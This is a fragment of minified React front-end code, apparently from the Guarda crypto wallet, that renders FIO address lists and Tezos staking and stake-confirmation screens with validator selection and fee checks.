                    null !== l ? l !== e.fioAddress.fio_address ? s(e.fioAddress.fio_address) : s(null) : s(e.fioAddress.fio_address)
                }
            }
            return O.createElement("div", {
                className: KU
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: VU,
                style: {
                    width: "90%"
                }
            })), O.createElement("div", {
                className: HU
            }, O.createElement(label, null, "FIO Addresses"), r.map((e => {
                var t, a, n, r;
                return O.createElement(O.Fragment, {
                    key: `${null === (t = e.fioAddress) || void 0 === t ? void 0 : t.fio_address}fio-wallet`
                }, O.createElement("div", {
                    className: zU,
                    onClick: handleToggleWallet(e)
                }, O.createElement(IconCurrency, {
                    currency: "fio",
                    className: $U
                }), O.createElement("div", {
                    className: ZU
                }, O.createElement("div", null, null === (a = e.fioAddress) || void 0 === a ? void 0 : a.fio_address), O.createElement("span", {
                    className: Ht()({
                        [qU]: "blocked" === getAccountStatus(e),
                        [XU]: "pending" === getAccountStatus(e)
                    })
                }, getAccountTitle(e))), O.createElement("img", {
                    src: VT,
                    alt: "",
                    className: jU
                })), (null === (n = e.fioAddress) || void 0 === n ? void 0 : n.fio_address) === l && O.createElement("div", {
                    className: eG
                }, O.createElement("div", {
                    className: QU
                }, O.createElement(label, null, "Wallet address"), O.createElement("a", {
                    onClick: () => goToWallet(e),
                    className: JU
                }, "Go to wallet")), O.createElement("span", {
                    className: YU
                }, null === (r = e.wallet) || void 0 === r ? void 0 : r.address), "pending" !== getAccountStatus(e) && O.createElement(O.Fragment, null, "blocked" !== getAccountStatus(e) && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("br", null), O.createElement("br", null), O.createElement("div", {
                    className: tG
                }, O.createElement(Yl, {
                    onClick: () => manageLinkedAddresses(e),
                    color: "light-blue"
                }, "Manage linked addresses"))))))
            }
            )), O.createElement("br", null), O.createElement("br", null), O.createElement("a", {
                href: "https://support.guarda.com/assets/what-is-fio-protocol",
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement(label, null, "What is FIO address and what does it give ", O.createElement("img", {
                src: Bp,
                alt: ""
            }))), O.createElement("br", null), O.createElement(Yl, {
                onClick: getFioAddress,
                color: "blue"
            }, "Get FIO address")))
        }
        function StakingContainer(e) {
            let {RightBlockContent: t, children: a, styles: n, wallet: r={}} = e;
            return O.createElement("div", {
                className: n.wrapper
            }, O.createElement(DashboardMenu, null), t && O.createElement(XO, null, O.createElement(t, null)), O.createElement("div", {
                className: n.wrapperForm
            }, (null == r ? void 0 : r.currency) && O.createElement(_m, {
                wallet: r,
                type: Qd
            }), a))
        }
        StakingContainer.propTypes = {
            RightBlockContent: as().elementType,
            children: as().oneOfType([as().arrayOf(as().node), as().node]),
            styles: as().shape({
                wrapper: as().string,
                wrapperForm: as().string
            }).isRequired,
            wallet: as().shape({
                currency: as().string
            })
        };
        const sG = StakingContainer
          , iG = {
            wrapper: "index_wrapper_3zvqh app_wrapperBlock_2EpA3",
            wrapperForm: "index_wrapperForm_1QxX4 app_wrapperLeftBlock_3QLZp",
            footerBlock: "index_footerBlock_1PrC2 app_footerBlock_n86Kc",
            stepInfo: "index_stepInfo_2ei04 app_stepInfo_2VLE6",
            toggleAdvancedOptions: "index_toggleAdvancedOptions_2-Md7"
        }
          , getDefaultValidator = (e, t) => {
            const a = "tz1d9ek6HrScY6QRZ71NJdB85MNz8gKGBjrv" === (null == t ? void 0 : t.address);
            let n;
            a || (n = e.find((e => "tz1d9ek6HrScY6QRZ71NJdB85MNz8gKGBjrv" === (null == e ? void 0 : e.address))));
            a && !n && (n = e.find((e => "tz1aRoaRhSpRYvFdyvgWLL6TGyRoGF51wDjM" === (null == e ? void 0 : e.address))));
            n || (n = e.find((e => "tz1d9ek6HrScY6QRZ71NJdB85MNz8gKGBjrv" === (null == e ? void 0 : e.address))));
            return n || (null == e ? void 0 : e[0])
        }
          , useInitialParams = e => {
            let {ticker: t} = e;
            const a = useLocationSearch()
              , n = (0,
            $.v9)(eu)
              , r = (0,
            $.v9)($c)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(void 0)
              , [c,u] = (0,
            O.useState)(a.amount || "")
              , [d] = (0,
            O.useState)(a.validatorAddress || "")
              , [m] = (0,
            O.useState)(a.unlockingAmount || "")
              , [p] = (0,
            O.useState)(a.validatorTitle || "")
              , [f] = (0,
            O.useState)(a.gasPrice || "")
              , E = (0,
            O.useMemo)(( () => a.amount && (0,
            Ko.eg)(a.amount, 0) ? a.amount : "0"), [a.amount]);
            (0,
            O.useEffect)(( () => {
                let e;
                if (a.walletFrom && !l && r.length) {
                    e = n(a.walletFrom);
                    e && o(e);
                    s(!0)
                }
                if (!a.walletFrom && !i && !l && r.length) {
                    const e = [...r].filter((e => e.currency === t && !e.watchOnly));
                    e.length > 0 && o(e[0])
                }
            }
            ), [i, l, a.walletFrom, n, t, r]);
            (0,
            O.useEffect)(( () => {
                if (r.length && l) {
                    const e = n(a.walletFrom);
                    e && o(e)
                }
            }
            ), [r, a, l, n]);
            return {
                fromWallet: i,
                setFromWallet: o,
                amount: c,
                setAmount: u,
                initialAmount: E,
                validatorAddress: d,
                validatorTitle: p,
                unlockingAmount: m,
                gasPrice: f
            }
        }
          , oG = useInitialParams
          , AvailableForStaking = e => {
            let {maxAmount: t, currency: a, setAmount: n} = e;
            const r = n ? () => n((0,
            Ko.yF)(t)) : void 0;
            return O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available for staking:"), O.createElement(MiskInfoValue, {
                onClick: r
            }, (0,
            Ko.yF)(t), " ", (0,
            be.xG)(a)))
        }
        ;
        async function fetchParameters(e) {
            let {selectedValidator: t, setValidatorParams: a, defaultValidator: n} = e;
            try {
                const {data: e} = await Jf().get(`https://api.baking-bad.org/v2/bakers/${t.address}`);
                e.minDelegation && a({
                    minDelegation: e.minDelegation
                });
                e.minDelegation || "Guarda Wallet" !== (null == n ? void 0 : n.title) || t.address !== (null == n ? void 0 : n.address) || a({
                    minDelegation: "0"
                })
            } catch (e) {}
        }
        function StakingXtzIndex() {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            j.k6)()
              , n = (0,
            $.v9)($c)
              , {activeValidator: r} = (0,
            $.v9)(getReceive)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(void 0)
              , [d,m] = (0,
            O.useState)(void 0)
              , [p,f] = (0,
            O.useState)(!1)
              , {convertToFiat: E} = useConverter()
              , {listOfValidators: h, isLoading: g} = bx()
              , y = h.filter((e => (null == e ? void 0 : e.address) !== (null == r ? void 0 : r.address)))
              , v = getDefaultValidator(h, r)
              , {fromWallet: _, setFromWallet: w, amount: b} = oG({
                ticker: "xtz"
            })
              , k = [...n].filter((e => "xtz" === e.currency))
              , S = 18
              , C = (0,
            Ko.FH)(_ ? _.balance : "0", {
                roundDown: !0,
                max: S
            });
            (0,
            O.useEffect)(( () => {
                !c && v && u(v)
            }
            ), [v, c]);
            (0,
            O.useEffect)(( () => {
                f(!1);
                u(v);
                s(!1)
            }
            ), [v, null == _ ? void 0 : _.uuid]);
            const handleChangeFromWallet = t => {
                e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !0
                }));
                w(t)
            }
            ;
            function handleSetValidator(e) {
                f(!1);
                u(e)
            }
            (0,
            O.useEffect)(( () => {
                i && o(!1)
            }
            ), [_]);
            (0,
            O.useEffect)(( () => {
                c && fetchParameters({
                    defaultValidator: v,
                    setValidatorParams: m,
                    selectedValidator: c
                })
            }
            ), [v, c]);
            function checkIfEnoughAmount() {
                if (d) {
                    const e = undefined;
                    (0,
                    Ko.eg)(C, d.minDelegation) || f(!0)
                }
            }
            const handleNext = () => {
                var e;
                checkIfEnoughAmount();
                const {isValid: n} = null == t || null === (e = t.current) || void 0 === e ? void 0 : e.validate();
                if (!n || !_ || !c) {
                    o(!0);
                    return
                }
                const r = {
                    validatorTitle: (null == c ? void 0 : c.title) || "",
                    validatorAddress: (null == c ? void 0 : c.address) || "",
                    validatorRate: (null == c ? void 0 : c.rate) || "",
                    walletFrom: (null == _ ? void 0 : _.uuid) || "",
                    amount: (null == _ ? void 0 : _.balance) || ""
                }
                  , l = (0,
                Ko.FH)(E(b, _, "usd"), {
                    max: 4
                });
                l && Object.assign(r, {
                    amountInUsd: l
                });
                const s = new URLSearchParams(r);
                a.push({
                    pathname: (0,
                    M.RU)("/staking-xtz/staking/confirm"),
                    search: s.toString()
                })
            }
              , N = undefined
              , T = {
                precision: S,
                min: d && (e => (0,
                Ko.gt)(e, "0") ? (0,
                Ko.PD)(e, "1").toString() : "0")(d.minDelegation),
                max: C,
                available: C
            }
              , A = O.memo(( () => O.createElement(panel_right_image, {
                src: mD
            }, "You can only stake the whole balance to one Validator. XTZ blockchain doesn't freeze your coins - you can send them or change the Validator at any time. All incoming XTZ will be automatically delegated to the current Validator. You can change the Validator at any time.")));
            return _ ? O.createElement(sG, {
                wallet: _,
                styles: iG,
                RightBlockContent: A
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: _
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: _,
                    wallets: k,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    customFilter: e => onCustomFilterWallets(e, ["xtz"]),
                    stakingCurrency: "XTZ"
                }))
            }
            )), O.createElement(label, null, "Deposit Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: null == _ ? void 0 : _.balance,
                rules: zf.amount(T)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    name: "lastpass-fix-search",
                    disabled: !0,
                    onChange: () => {}
                    ,
                    value: (null == _ ? void 0 : _.balance) || "",
                    placeholder: "0"
                }))
            }
            ))), d && (0,
            Ko.gt)(d.minDelegation, "0") && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Min Delegation Amount:"), O.createElement(MiskInfoValue, null, (0,
            Ko.PD)(d.minDelegation, "1").toString(), " XTZ")), O.createElement(AvailableForStaking, {
                currency: _.currency,
                maxAmount: C
            }), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, c ? `${null == c ? void 0 : c.title} (${null == c ? void 0 : c.subtitle})` : O.createElement(LoaderDots, {
                visible: !0
            }))), O.createElement("div", {
                className: iG.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: () => s(!l),
                className: "dashedNormal"
            }, l ? "Hide advanced options" : "Advanced options")), l && O.createElement(O.Fragment, null, O.createElement(label, null, "To"), O.createElement(lf.ValidatorField, {
                rules: zf.xtzValidator,
                value: c
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && i,
                    message: a
                }, O.createElement(Lp, {
                    selected: c,
                    isLoading: g,
                    items: y,
                    placeholder: "Select Validator",
                    emptyPlaceholder: "Validators not found",
                    onChange: handleSetValidator
                }))
            }
            )), c && "tz1d9ek6HrScY6QRZ71NJdB85MNz8gKGBjrv" !== c.address && O.createElement(ui_message, {
                type: "warning"
            }, "We cannot guarantee the stability of a third-party validator. Please do your own research to assess risks.")), p && ((null == c ? void 0 : c.address) === (null == v ? void 0 : v.address) ? O.createElement(ui_message, {
                type: "error"
            }, "It is necessary to have at least ", (0,
            Ko.PD)(null == d ? void 0 : d.minDelegation, "1").toString(), " XTZ to stake. Please top up your wallet.") : O.createElement(ui_message, {
                type: "error"
            }, "It is necessary to have at least ", (0,
            Ko.PD)(null == d ? void 0 : d.minDelegation, "1").toString(), " XTZ to stake with the selected validator. Please try another validator or top up the wallet.")), O.createElement(lf.ValidatorField, {
                value: d && d.minDelegation < C,
                rules: zf.bool
            }), O.createElement("div", {
                className: iG.footerBlock
            }, O.createElement("div", {
                className: iG.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))) : null
        }
        const executeCallbackAndSetTimeout = e => {
            let {callback: t, ms: a} = e;
            t();
            return new Promise((e => setTimeout(e, a || 200)))
        }
          , cG = "https://support.guarda.com/assets/how-to-send-tokens"
          , uG = "Please check details and confirm"
          , useBooleanRules = e => {
            let {fee: t, feeWallet: a, amount: n, maxAmount: r, fromWallet: l, isStakeWholeBalance: s, isStakeTx: i, feeResource: o, trxResources: c} = e;
            const u = (0,
            O.useMemo)(( () => o ? !("bandwidth" !== o || !c) && (0,
            Ko.gt)(t, c.netAvailable) : !i || s || (null == a ? void 0 : a.uuid) !== (null == l ? void 0 : l.uuid) ? (0,
            Ko.gt)(t, null == a ? void 0 : a.balance) : (0,
            Ko.gt)((0,
            Ko.PD)(n, t).toString(), r || (null == a ? void 0 : a.balance))), [o, i, s, null == a ? void 0 : a.uuid, null == a ? void 0 : a.balance, null == l ? void 0 : l.uuid, c, n, t, r])
              , d = (0,
            O.useMemo)(( () => !o && (0,
            Ko.gt)(t, n)), [t, n, o])
              , m = (0,
            O.useMemo)(( () => "ong" === (null == a ? void 0 : a.currency)), [null == a ? void 0 : a.currency])
              , p = (0,
            O.useMemo)(( () => (null == l ? void 0 : l.hw) || (null == a ? void 0 : a.hw)), [null == a ? void 0 : a.hw, null == l ? void 0 : l.hw])
              , f = undefined;
            return {
                isInsufficientBalance: u,
                isSmallReward: d,
                isFeeWalletOng: m,
                isHardWallet: (0,
                O.useMemo)(( () => Boolean(p)), [p]),
                hardWalletType: p
            }
        }
          , useWalletsForStakingTx = e => {
            let {walletIdFromParams: t, validatorAddress: a, validatorPublicKey: n, toWalletIsFromWallet: r} = e;
            const l = (0,
            $.I0)()
              , s = (0,
            $.v9)(eu)
              , [i,o] = (0,
            O.useState)(void 0)
              , [c] = fee_wallet(i)
              , u = (0,
            O.useMemo)(( () => r ? {
                uuid: (null == i ? void 0 : i.uuid) || "",
                address: (null == i ? void 0 : i.address) || "",
                currency: (null == i ? void 0 : i.currency) || ""
            } : {
                uuid: "",
                address: n || a || "",
                currency: (null == i ? void 0 : i.currency) || ""
            }), [i, r, a, n]);
            (0,
            O.useEffect)(( () => {
                if (!i) {
                    const e = s(t);
                    if (e) {
                        o(e);
                        l(lb.updateWalletBalanceByUuid({
                            uuid: e.uuid
                        }))
                    }
                }
            }
            ), [l, i, s, t]);
            return {
                fromWallet: i,
                toWallet: u,
                feeWallet: c
            }
        }
          , useFormattedValue = e => {
            let {amount: t, fromWallet: a, feeWallet: n} = e;
            const r = undefined
              , l = undefined
              , s = undefined
              , i = undefined;
            return {
                formattedAmount: (0,
                O.useMemo)(( () => (0,
                Ko.yF)(t)), [t]),
                formattedCurrency: (0,
                O.useMemo)(( () => (0,
                be.xG)(null == a ? void 0 : a.currency)), [null == a ? void 0 : a.currency]),
                formattedFamily: (0,
                O.useMemo)(( () => (0,
                be.xG)(null == a ? void 0 : a.family)), [null == a ? void 0 : a.family]),
                formattedFeeCurrency: (0,
                O.useMemo)(( () => (0,
                be.xG)(null == n ? void 0 : n.currency)), [null == n ? void 0 : n.currency])
            }
        }
          , useEquivalentValue = e => {
            let {amount: t, fromWallet: a} = e;
            const {convertToFiat: n} = useConverter()
              , r = undefined
              , l = undefined;
            return {
                equivalentAmount: (0,
                O.useMemo)(( () => n(t, a)), [n, a, t]),
                equivalentAmountUsd: (0,
                O.useMemo)(( () => n(t, a, "usd")), [t, n, a])
            }
        }
          , useEffectiveValue = e => {
            let {fromWalletCurrency: t, validatorTitle: a, validatorRate: n, fee: r, fromWalletPrivateKey: l} = e;
            const s = undefined
              , i = undefined
              , o = undefined
              , c = undefined
              , u = undefined;
            return {
                effectiveCurrency: (0,
                O.useMemo)(( () => "ada-shelley" === t ? "ada" : t), [t]),
                effectiveValidatorTitle: (0,
                O.useMemo)(( () => null == a ? void 0 : a.replace("+", " ")), [a]),
                effectiveValidatorRate: (0,
                O.useMemo)(( () => {
                    let e = n.trim();
                    if (!e)
                        return "";
                    "%" !== e[e.length - 1] && (e += "%");
                    return e
                }
                ), [n]),
                effectiveFee: (0,
                O.useMemo)(( () => {
                    let e = r || "";
                    "number" == typeof e && (e = e.toString());
                    return e
                }
                ), [r]),
                effectivePrivateKey: (0,
                O.useMemo)(( () => {
                    let e = (0,
                    CE.T9)(l) || "";
                    !e && (0,
                    CE.zv)(l) && (e = l);
                    return e
                }
                ), [l])
            }
        }
          , useReceiveAmount = e => {
            let {fee: t, isStakeWholeBalance: a, amount: n} = e;
            const r = (0,
            O.useMemo)(( () => a && n && t ? (0,
            Ko.h9)(n, t).toString() : n), [t, a, n])
              , l = (0,
            O.useMemo)(( () => (0,
            Ko.G)(r, 0)), [r]);
            return {
                receiveAmount: r,
                isReceiveAmountLteZero: l
            }
        }
          , FeeBlock = e => {
            let {fee: t, isLoadingFee: a, formattedFeeCurrency: n, feeWallet: r, resource: l} = e;
            const {convertToFiat: s} = useConverter()
              , {localCurrency: i} = local_currency_useLocalCurrency()
              , o = (0,
            O.useMemo)(( () => s(t, r)), [s, t, r]);
            return O.createElement(O.Fragment, null, !t || a ? "–" : O.createElement("span", null, t, " ", O.createElement("span", {
                className: "nowrap"
            }, n)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: l ? s() : o
            }), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(i))))
        }
          , HardWalletMessage = e => {
            let {isVisible: t, formattedFamily: a, hardWalletType: n} = e;
            return O.createElement(O.Fragment, null, t && O.createElement(ui_message, null, "Please unlock your ", n, ", choose ", a, " app and then press Confirm."))
        }
          , dG = "FailedLoadFeeError_updateBalanceLink_ee5Bz"
          , FailedLoadFeeError_FailedLoadFeeError = e => {
            let {isVisible: t, handleRetryFee: a} = e;
            return O.createElement(O.Fragment, null, t && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: dG,
                onClick: a
            }, "try again")))
        }
          , mG = "InsufficientBalanceError_updateBalanceLink_UW1sV"
          , InsufficientBalanceError_InsufficientBalanceError_InsufficientBalanceError = e => {
            let {isVisible: t, fee: a, formattedFeeCurrency: n, fromWallet: r, feeWalletBalance: l, isFeeWalletOng: s} = e;
            const i = (0,
            $.I0)()
              , handleUpdateBalance = e => async () => {
                i(lb.updateWalletBalanceByUuid({
                    uuid: e.uuid
                }))
            }
            ;
            return O.createElement(O.Fragment, null, t && O.createElement(ui_message, {
                type: "error"
            }, "Cannot pay the fee – insufficient funds.", O.createElement("br", null), "Available balance: ", l, " ", n, O.createElement("br", null), "You need ", a, " ", n, " ", " ", O.createElement("a", {
                className: mG,
                onClick: handleUpdateBalance(r)
            }, "Update wallet balance"), s && O.createElement(O.Fragment, null, O.createElement("br", null), O.createElement("a", {
                className: mG,
                href: cG,
                target: "_blank",
                rel: "noreferrer"
            }, "Why do I need ONG?"))))
        }
          , CloseOrConfirmButton = e => {
            let {showConfirmButton: t, walletUuid: a, onClick: n, isLoading: r} = e;
            return O.createElement(O.Fragment, null, t ? O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: n,
                isLoading: r
            }, "Confirm") : O.createElement(Y.OL, {
                to: (0,
                M.RU)(`/receive?wallet=${a}`)
            }, O.createElement(Yl, {
                color: "blue",
                size: "big"
            }, "Close")))
        }
          , pG = "a44b8d5a751b3d7577e423626a446143"
          , fG = "58a7fc06a854deb8e23b690bb2025882"
          , EG = "ac4f1136fbb6ff6ac3f4fc472e791107"
          , getEverstakeIdByCurrency = e => {
            let {currency: t} = e
              , a = "";
            switch (t) {
            case "ada":
            case "ada-shelley":
                a = EG;
                break;
            case "atom":
                a = fG;
                break;
            default:
                a = ""
            }
            return a
        }
          , hG = Jf().create({
            baseURL: "/api/v1/internal/proxy/https://aff-api.everstake.one",
            headers: {
                "Content-Type": "application/json",
                "X-API-Key": `${pG}`
            },
            timeout: 7e3
        })
          , gG = "stake-confirm_wrapper_2k6_a app_wrapperBlock_2EpA3"
          , yG = "stake-confirm_wrapperForm_3f94F app_wrapperLeftBlock_3QLZp"
          , vG = "stake-confirm_lock_cVdVW"
          , _G = "stake-confirm_wrapperCenterForm_2qdRN app_wrapperCenterBlock_bcslh"
          , wG = "stake-confirm_headerTitles_QaCx9"
          , bG = "stake-confirm_separator_1H0lu"
          , kG = "stake-confirm_isConfirmError_1uaCl"
          , SG = "stake-confirm_flickerAnimation_31JMb"
          , CG = "stake-confirm_footerBlock_2L3CG"
          , NG = "stake-confirm_stepInfo_1wYLc"
          , TG = "stake-confirm_buttonsWrapper_1J1qs"
          , AG = "stake-confirm_feeInfoToggle_1738d"
          , xG = "stake-confirm_loaderWrapper_3FrQZ"
          , IG = "stake-confirm_updateBalanceLink_1Si1q"
          , PG = "stake-confirm_errorParams_2JcdE"
          , LG = "stake-confirm_topUpWalletLink_2NhiC"
          , FG = "stake-confirm_userSelect_2N1wB"
          , WG = "stake-confirm_tokenInfoBlock_3MDO9"
          , RG = "stake-confirm_tokenInfoBlockItem_1NWr_";
        function formatResource(e) {
            return e.charAt(0).toUpperCase() + e.slice(1)
        }
        const StakeConfirm_StakeConfirm = e => {
            let {customCondition: t, customAdditionalSend: a, isMaxNetworkFee: n, isStakeWholeBalance: r, toWalletIsFromWallet: l} = e;
            const {amount: s, walletFrom: i, validatorAddress: o, validatorRate: c, validatorTitle: u, validatorPublicKey: d, isValidatorEverstake: m, maxAmount: p, resource: f, resourceAmount: E} = useLocationSearch()
              , h = (0,
            j.k6)()
              , g = (0,
            j.TH)()
              , y = (0,
            $.I0)()
              , v = (0,
            $.v9)(nx)
              , _ = (0,
            $.v9)(rx)
              , w = (0,
            $.v9)(sx)
              , b = (0,
            $.v9)(ix)
              , k = (0,
            O.useMemo)(( () => Boolean(v || b)), [v, b])
              , {fromWallet: S, toWallet: C, feeWallet: N} = useWalletsForStakingTx({
                walletIdFromParams: i,
                validatorAddress: o,
                validatorPublicKey: d,
                toWalletIsFromWallet: l
            })
              , T = (0,
            $.v9)((e => Oc(e, (null == S ? void 0 : S.uuid) || "")));
            (0,
            O.useEffect)((function fetchTrxResourcesOnUpdate() {
                S && y(td({
                    address: S.address,
                    walletId: S.uuid
                }))
            }
            ), [S, y]);
            const A = (0,
            O.useMemo)(( () => null == T ? void 0 : T.resources), [null == T ? void 0 : T.resources])
              , x = (0,
            O.useMemo)(( () => !!S && "trx" === S.currency), [S])
              , I = (0,
            O.useMemo)(( () => ({
                totalBalance: S ? S.balance : void 0,
                ...a
            })), [a, S])
              , [P,L,F,W,,R] = use_fee(S, C, s, I, "stake")
              , {hardWalletType: B, isHardWallet: D, isFeeWalletOng: U, isInsufficientBalance: G} = useBooleanRules({
                fee: P,
                feeWallet: N,
                fromWallet: S,
                amount: s,
                maxAmount: p,
                isStakeWholeBalance: r,
                isStakeTx: !0,
                feeResource: R,
                trxResources: A
            })
              , {effectiveCurrency: V, effectiveValidatorRate: K, effectiveValidatorTitle: H, effectiveFee: z, effectivePrivateKey: Z} = useEffectiveValue({
                fromWalletCurrency: (null == S ? void 0 : S.currency) || "",
                validatorRate: c || "",
                validatorTitle: u || "",
                fee: P,
                fromWalletPrivateKey: (null == S ? void 0 : S.privateKey) || ""
            })
              , {receiveAmount: Y, isReceiveAmountLteZero: q} = useReceiveAmount({
                fee: z,
                isStakeWholeBalance: r || !1,
                amount: s || ""
            })
              , {formattedFeeCurrency: X, formattedCurrency: Q, formattedAmount: J, formattedFamily: ee} = useFormattedValue({
                feeWallet: N,
                fromWallet: S,
                amount: Y
            })
              , {equivalentAmount: te, equivalentAmountUsd: ae} = useEquivalentValue({
                amount: Y,
                fromWallet: S
            })
              , ne = (0,
            O.useCallback)((async e => {
                await executeCallbackAndSetTimeout({
                    callback: () => y(lb.setProcessCommit({
                        processText: e
                    }))
                })
            }
            ), [y])
              , handleBack = () => {
                let e = "/receive";
                V && (e = `/staking-${V}/staking`);
                h.replace({
                    pathname: (0,
                    M.RU)(e),
                    search: g.search
                })
            }
              , handleConfirm = async () => {
                var e;
                k || G || F || !S || t || q || y(lb.stakeConfirm({
                    uuid: S.uuid,
                    wallet: {
                        currency: S.currency,
                        balance: S.balance,
                        privateKey: Z,
                        address: S.address,
                        rewardAddress: S.rewardAddress,
                        accountIndex: null === (e = S.derivedFromMnemonicUsing) || void 0 === e ? void 0 : e.accountIndex
                    },
                    resource: f,
                    fee: z,
                    validatorAddress: d || o,
                    amount: s || ""
                }))
            }
            ;
            (0,
            O.useEffect)((function showLoadingTextOfLoadingFee() {
                y(F ? lb.setLoadingStart({
                    processText: "Loading Fee..."
                }) : lb.setLoadingStop())
            }
            ), [y, F, ne]);
            (0,
            O.useLayoutEffect)((function goToNextStepIfHaveTransactionHash() {
                if (b) {
                    if (m) {
                        const e = getEverstakeIdByCurrency({
                            currency: V
                        });
                        try {
                            const t = {
                                link_id: e,
                                delegations: [`${b}`]
                            };
                            hG.post("/guarda/delegations", t)
                        } catch (e) {}
                    }
                    const e = new URLSearchParams({
                        type: `${null == S ? void 0 : S.currency}StakeTx`,
                        amount: s || "",
                        hash: b,
                        walletFrom: (null == S ? void 0 : S.uuid) || "",
                        currency: (null == S ? void 0 : S.currency) || ""
                    });
                    h.replace({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: e.toString()
                    })
                }
            }
            ), [s, V, null == S ? void 0 : S.currency, null == S ? void 0 : S.uuid, h, m, b]);
            (0,
            O.useEffect)((function clearStore() {
                return () => {
                    y(lb.setClearStore())
                }
            }
            ), []);
            return S && N ? O.createElement("div", {
                className: gG
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, uG)), O.createElement("div", {
                className: yG
            }, O.createElement("div", {
                className: wG
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Stake ", J, " ", O.createElement("span", {
                className: "nowrap"
            }, Q), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will stake", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, J, " ", O.createElement("span", {
                className: "nowrap"
            }, Q), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: te,
                renderCurrency: !0
            })))), O.createElement(ConfirmInfoWallet, {
                type: "from",
                wallet: S
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Validator", O.createElement(ConfirmInfoSubTitle, null, "Address")), O.createElement(ConfirmInfoValue, null, H && O.createElement("span", {
                id: `${V}Validator`
            }, H), K ? ` - ${K}` : "", O.createElement(ConfirmInfoSubValue, null, o))), x && E && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will get"), O.createElement(ConfirmInfoValue, null, f && E + " " + formatResource(f) || "-")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, n ? "Max Network Fee" : "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, O.createElement(FeeBlock, {
                fee: P,
                isLoadingFee: F,
                feeWallet: N,
                formattedFeeCurrency: R ? formatResource(R) : X,
                resource: R
            }))), O.createElement("div", {
                className: bG
            }), O.createElement(ledger_token_info, {
                parentWallet: N
            }), O.createElement(HardWalletMessage, {
                isVisible: k && D,
                hardWalletType: B || "",
                formattedFamily: ee
            }), O.createElement(FailedLoadFeeError_FailedLoadFeeError, {
                isVisible: L,
                handleRetryFee: W
            }), O.createElement(InsufficientBalanceError_InsufficientBalanceError_InsufficientBalanceError, {
                isVisible: G || q,
                formattedFeeCurrency: R || X,
                fee: P,
                fromWallet: S,
                isFeeWalletOng: U,
                feeWalletBalance: (null == A ? void 0 : A.netAvailable) || N.balance
            }), w && O.createElement(bf, {
                error: w
            }), O.createElement("div", {
                className: CG
            }, k && O.createElement("div", {
                className: xG
            }, _ && O.createElement("span", null, _)), !k && O.createElement("div", {
                className: NG
            }, "Step 2 of 3"), O.createElement("div", {
                className: TG
            }, !k && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(CloseOrConfirmButton, {
                showConfirmButton: !(G || q),
                isLoading: k,
                onClick: handleConfirm,
                walletUuid: S.uuid
            })))), O.createElement("input", {
                id: `${S.currency}StakeAmountInUsd`,
                type: "hidden",
                name: "amountInUsd",
                value: ae
            })) : null
        }
          , XtzStakeConfirm = () => O.createElement(StakeConfirm_StakeConfirm, {
            isStakeWholeBalance: !0
        })
          , BG = {
            wrapper: "staking_wrapper_-8Z6c app_wrapperBlock_2EpA3",
            wrapperForm: "staking_wrapperForm_1mjhO app_wrapperLeftBlock_3QLZp",
            footerBlock: "staking_footerBlock_3phzP app_footerBlock_n86Kc",
            stepInfo: "staking_stepInfo_WT8Hd app_stepInfo_2VLE6",
            toggleAdvancedOptions: "staking_toggleAdvancedOptions_pU33W"
        }
          , use_use_wallets_from = () => {
            const e = undefined;
            let t = [...(0,
            $.v9)($c)].filter((e => "bnb" === e.currency));
            t = t.reduce(( (e, t) => {
                const a = t.clone();
                if (a.isHw)
                    return e;
                a.subWallets = t.subWallets.filter((e => "now-e68" === e.currency));
                e.push(...a.subWallets);
                return e
            }
            ), []);
            return t
        }
          , BoardBnbStakingPage = () => {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            j.k6)()
              , n = (0,
            $.v9)(lu)
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)("")
